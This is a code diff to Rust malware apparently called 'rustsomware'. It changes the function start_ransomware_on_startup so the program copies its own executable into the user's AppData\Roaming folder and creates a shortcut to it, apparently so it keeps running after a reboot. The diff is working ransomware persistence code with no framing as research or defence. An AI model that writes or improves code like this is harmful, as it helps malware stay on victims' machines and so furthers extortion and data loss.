@@ -266,14 +266,26 @@ pub fn start_ransomware_on_startup() {
         Err(_) => (),
     };
 
+    let exec_name = match get_exec_name() {
+        Some(name) => name,
+        None => return,
+    };
+
     // Copy the program to a different path
     match get_home_dir() {
         Some(dir) => {
             let destination = dir.clone() + "\\AppData\\Roaming\\rustsomware\\";
-            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\rustsomware.exe";
+            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\" + &exec_name;
             let lnk = target.clone() + ".lnk";
-            fs::create_dir(&destination);
-            match fs::copy("rustsomware.exe", &target) {
+            match fs::create_dir(&destination) {
+                Ok(_) => (),
+                Err(_) => {
+                    fs::remove_dir_all(&destination);
+                    fs::create_dir(&destination);
+                    ()
+                }
+            }
+            match fs::copy(&exec_name, &target) {
                 Ok(_) => match ShellLink::new(&target) {
                     Ok(sl) => {
                         sl.create_lnk(&lnk);
@@ -296,4 +308,11 @@ fn get_home_dir() -> Option<String> {
         },
         None => None,
     }
+}
+
+pub fn get_exec_name() -> Option<String> {
+    std::env::current_exe()
+        .ok()
+        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
+        .and_then(|s| s.into_string().ok())
 }
